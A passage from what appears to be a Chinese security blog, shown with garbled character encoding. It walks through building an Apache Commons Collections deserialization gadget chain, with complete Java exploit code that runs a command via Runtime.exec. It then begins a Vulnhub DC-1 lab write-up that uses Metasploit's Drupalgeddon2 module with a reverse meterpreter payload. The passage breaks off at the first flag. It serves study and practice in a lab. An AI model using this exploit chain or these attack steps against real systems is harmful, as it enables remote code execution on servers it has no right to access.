class="line">ÂêéÁª≠Âà©Áî®Èìæ.hashCode()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430291.png" alt="image-20230507143036238"><br>ÁÑ∂ÂêéÂà©Áî®hashÊñπÊ≥ïÂÜôexp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//‰º†ÂÖ•LazyMapÂ∞±ÂíåÂêéÈù¢ËøûËµ∑Êù•‰∫ÜÔºåÂç≥Ë∞ÉÁî®ÁöÑÊòØLazyMapÁöÑgetÊñπÊ≥ï  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putÊñπÊ≥ïÈáåÈù¢‰ºöË∞ÉÁî®hashÊñπÊ≥ï  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÁúã‰∏Ä‰∏ãÁé∞Âú®ÁöÑEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="comment">//‰º†ÂÖ•LazyMapÂ∞±ÂíåÂêéÈù¢ËøûËµ∑Êù•‰∫ÜÔºåÂç≥Ë∞ÉÁî®ÁöÑÊòØLazyMapÁöÑgetÊñπÊ≥ï  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putÊñπÊ≥ïÈáåÈù¢‰ºöË∞ÉÁî®hashÊñπÊ≥ï  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âú®Ê≥®ÈáäÊéâÂèçÂ∫èÂàóÂåñÂêéËøòÊòØËÉΩÂºπÂá∫ËÆ°ÁÆóÂô®ÔºåËøôËÇØÂÆöÊòØÊúâÈóÆÈ¢òÁöÑÔºåËøôÈáåÂíåURLDNSÁöÑÊÄùÊÉ≥ÂÖ∂ÂÆûÂ∑Æ‰∏çÂ§öÔºåÂú®ÊâßË°å <code>put()</code> ÊñπÊ≥ïÁöÑÊó∂ÂÄôÔºåÈáåÈù¢‰πü‰ºöÊâßË°åhashÊñπÊ≥ï‰ΩÜÊòØË¶ÅÁöÑÊòØreadObjectÈáåÈù¢ÁöÑputVal‰∏≠Ë∞ÉÁî®ÁöÑhashÊñπÊ≥ïÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË¶Å‰øÆÊîπ‰∏ãÈù¢ËøôÊù°ËØ≠Âè•ÁöÑÂèÇÊï∞Âç≥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>Êàë‰ª¨ÂÖàÂú®Â∫èÂàóÂåñÁöÑÊó∂ÂÄô‰º†ËøõÂéª‰∏Ä‰∏™Ê≤°Áî®ÁöÑÂèÇÊï∞ÔºåÁÑ∂ÂêéÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÂÜçÈáçÊñ∞ËµãÂÄºÂ∞±Ë°åÔºåÊîπ‰∏∫‰∏ãÈù¢ËøôÊ†∑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>putÂÆå‰πãÂêéÈÄöËøáÂèçÂ∞ÑÂÜçÊîπÂõûÊù•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØÊîπÂÆå‰πãÂêéÂèçÂ∫èÂàóÂåñ‰πü‰∏çÂºπËÆ°ÁÆóÂô®‰∫ÜÔºå‰∏ã‰∏™Êñ≠ÁÇπË∞ÉËØï‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071430225.png" alt="image-20230507143052175"><br>ÊúÄÁªàÈóÆÈ¢òÂá∫Âú®LazyMap‰∏ãÁöÑgetÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431873.png" alt="image-20230507143107809"><br>putÁöÑÊó∂ÂÄô‰ºö‰º†ÂÖ•‰∏Ä‰∏™keyÂèçÂ∫èÂàóÂåñÊó†Ê≥ïËøõÂÖ•ifÊâßË°åtransformÊñπÊ≥ïÔºåÊâÄ‰ª•ÈúÄË¶ÅÂà†ÊéâËøô‰∏™key</p><h2 id="ÊúÄÁªàEXP"><a href="#ÊúÄÁªàEXP" class="headerlink" title="ÊúÄÁªàEXP"></a>ÊúÄÁªàEXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">        <span class="comment">//‰º†ÂÖ•LazyMapÂ∞±ÂíåÂêéÈù¢ËøûËµ∑Êù•‰∫ÜÔºåÂç≥Ë∞ÉÁî®ÁöÑÊòØLazyMapÁöÑgetÊñπÊ≥ï  </span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//putÊñπÊ≥ïÈáåÈù¢‰ºöË∞ÉÁî®hashÊñπÊ≥ïÔºå‰ΩÜÊòØÊàë‰ª¨Ë¶ÅÁöÑÊòØputValÈáåÈù¢ÁöÑhashÊñπÊ≥ïÂØπkeyËøõË°åËÆ°ÁÆó  </span></span><br><span class="line">        <span class="comment">//ÊâÄ‰ª•Â∞±ÈúÄË¶ÅÈÄöËøáÂèçÂ∞ÑÂØπputÊîπÂÄºÔºåËÆ©‰ªñ‰∏çËß¶ÂèëËøôÊù°Èìæ  </span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431402.png" alt="image-20230507143122325"><br>ËøôÈáåËøòÊúâ‰∏Ä‰∏™ÁÇπÂ∞±ÊòØideaÁöÑËÆæÁΩÆÈóÆÈ¢òÔºåÂú® IDEA ËøõË°å debug Ë∞ÉËØïÁöÑÊó∂ÂÄôÔºå‰∏∫‰∫ÜÂ±ïÁ§∫ÂØπË±°ÁöÑÈõÜÂêàÔºå‰ºöËá™Âä®Ë∞ÉÁî® <code>toString()</code> ÊñπÊ≥ïÔºåÊâÄ‰ª•Âú®ÂàõÂª∫ <code>TiedMapEntry</code> ÁöÑÊó∂ÂÄôÔºåÂ∞±Ëá™Âä®Ë∞ÉÁî®‰∫Ü <code>getValue()</code> ÊúÄÁªàÂ∞ÜÈìæÂ≠êËµ∞ÂÆåÔºåÁÑ∂ÂêéÂºπÂá∫ËÆ°ÁÆóÂô®ÔºåÊâÄ‰ª•ÈúÄË¶ÅËøõË°åÂ¶Ç‰∏ã‰øÆÊîπ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431521.png" alt="image-20230507143138470"><br>ËÆæÁΩÆÊàêËøôÊ†∑Â∞±Ë°å</p><h2 id="Âà©Áî®Èìæ"><a href="#Âà©Áî®Èìæ" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap.hash()</span><br><span class="line">TiedMapEntry.hashCode()</span><br><span class="line">TiedMapEntry.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="ÊµÅÁ®ãÂõæ"><a href="#ÊµÅÁ®ãÂõæ" class="headerlink" title="ÊµÅÁ®ãÂõæ"></a>ÊµÅÁ®ãÂõæ</h2><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071431635.png" alt="image-20230507143149592"></p><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>ËøôÊù°ÈìæÂ≠êÂèÇËÄÉÂçöÂÆ¢Ë∑üÂà∞‰∏ÄÂçäÊêû‰∏çÊáÇ‰∫ÜÁÑ∂ÂêéÂéªÁúãÁôΩÊó•Ê¢¶ÁªÑÈïøÁöÑËßÜÈ¢ëÂèàÁêÜ‰∫Ü‰∏Ä‰∏ãÊâçÂÆåÊàêËøôÊù°ÈìæÂ≠êÔºå‰∏çÂæó‰∏çËØ¥ÁôΩÊó•Ê¢¶ÁªÑÈïøËÆ≤ÁöÑÁ°ÆÂÆûÁªÜ</p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC-1</title>
      <link href="/2023/05/Vulnhub-DC-1/"/>
      <url>/2023/05/Vulnhub-DC-1/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÂáÜÂ§á"><a href="#ÁéØÂ¢ÉÂáÜÂ§á" class="headerlink" title="ÁéØÂ¢ÉÂáÜÂ§á"></a>ÁéØÂ¢ÉÂáÜÂ§á</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/">ÂÆòÁΩëÁõ¥Êé•‰∏ãËΩΩzip</a></p><h2 id="‰ø°ÊÅØÊêúÈõÜ"><a href="#‰ø°ÊÅØÊêúÈõÜ" class="headerlink" title="‰ø°ÊÅØÊêúÈõÜ"></a>‰ø°ÊÅØÊêúÈõÜ</h2><p>È¶ñÂÖàÊâ´Êèè‰∏Ä‰∏ã‰∏ªÊú∫Â≠òÊ¥ªÁúã‰∏Ä‰∏ãÈù∂Êú∫IPÔºåÂèØ‰ª•‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332767.png" alt="image-20230503133212652"><br>ÊúÄÂêéÁ°ÆÂÆöÈù∂Êú∫IP‰∏∫192.168.75.133ÂèØ‰ª•‰∏Ä‰∏™‰∏™ËÆøÈóÆÁ°ÆÂÆöÔºå‰πüÂèØ‰ª•Áúã‰∏Ä‰∏ãÈù∂Êú∫ÁöÑmacÂú∞ÂùÄÁ°ÆÂÆö<br>ËÆøÈóÆÂæóÂà∞Â¶Ç‰∏ãÈ°µÈù¢<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332069.png"><br>Ëøô‰∏™DrupalÊúâ‰∏™ËøúÁ®ã‰ª£Á†ÅÊâßË°åÁöÑcve‰∏∫CVE-2018-7600ÔºåÂΩìÁÑ∂Ëøò‰∏çÁü•ÈÅìÁâàÊú¨ÂØπ‰∏çÂØπÔºå‰∏çËøáÂÖà‰∏çÊÄ•ÁùÄÁúãËøô‰∏™CVEÔºåÁî®nmapÊâ´Êèè‰∏Ä‰∏ãÂºÄÊîæÁöÑÁ´ØÂè£<br><code>nmap -A 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332578.png" alt="image-20230503133247513"><br>Âà©Áî®Êèí‰ª∂Áúã‰∏Ä‰∏ãÊåáÁ∫π‰ø°ÊÅØÔºåÂèØ‰ª•ÁúãÂà∞DrupalÁâàÊú¨‰∏∫7ÊòØÂ≠òÂú®Ëøô‰∏™CVEÊºèÊ¥ûÁöÑ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031332162.png" alt="image-20230503133258116"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>Áõ¥Êé•Âà©Áî®msfconsoleÊù•Áúã‰∏Ä‰∏ãÔºåËøôÈáåÊâãÂä®ÂºÑÁöÑËØùÂæàÈ∫ªÁÉ¶ÔºåËøõÂÖ•msfÊêú‰∏Ä‰∏ãËøô‰∏™Ê®°Âùó<br><code>search Drupal</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333978.png" alt="image-20230503133311896"><br>Áõ¥Êé•‰ΩøÁî®18Âπ¥ÁöÑÈÇ£‰∏™CVE<code>use exploit/unix/webapp/drupal_drupalgeddon2</code>ÁÑ∂ÂêéÊü•Áúã‰∏Ä‰∏ãpayloadÊâßË°å<code>show payloads</code>ÂèØ‰ª•ÁúãÂà∞ÊâÄÊúâpayloadÂàóÂá∫Ôºå‰ΩøÁî®Â¶Ç‰∏ãpayloadÔºåËøôÈáå‰πüÂèØ‰ª•‰∏çËÆæÁΩÆÔºåÊàëÊòØ‰∏∫‰∫ÜÁªÉ‰π†‰∏Ä‰∏ãÂ∑•ÂÖ∑‰ΩøÁî®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333921.png" alt="image-20230503133321883"><br><code>set payload php/meterpreter/reverse_tcp</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333997.png" alt="image-20230503133330955"><br>ÁÑ∂ÂêéÊü•ÁúãÈúÄË¶ÅÈÖçÁΩÆÁöÑÂèÇÊï∞<br><code>show options</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031333547.png" alt="image-20230503133344476"><br>yes‰∏∫ÂøÖÂ°´ÂèÇÊï∞ÔºåÊúâÈªòËÆ§ÁöÑÁõ¥Êé•Áî®ÔºåËøôÈáåÂ∞±Âè™ÈúÄË¶ÅÈÖç‰∏Ä‰∏ãRHOSTSÂç≥Èù∂Êú∫IP<br><code>set rhosts 192.168.75.133</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334617.png" alt="image-20230503133401577"><br>ÁÑ∂ÂêéÂºÄÂßãÊîªÂáª<code>exploit</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334085.png" alt="image-20230503133412030"><br>ÊîªÂáªÊàêÂäüÔºåÊãøshell<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334632.png" alt="image-20230503133423597"><br>lsÁúãÂà∞flag1ÂÖàÊâìÂºÄÁúãÁúã<br><img 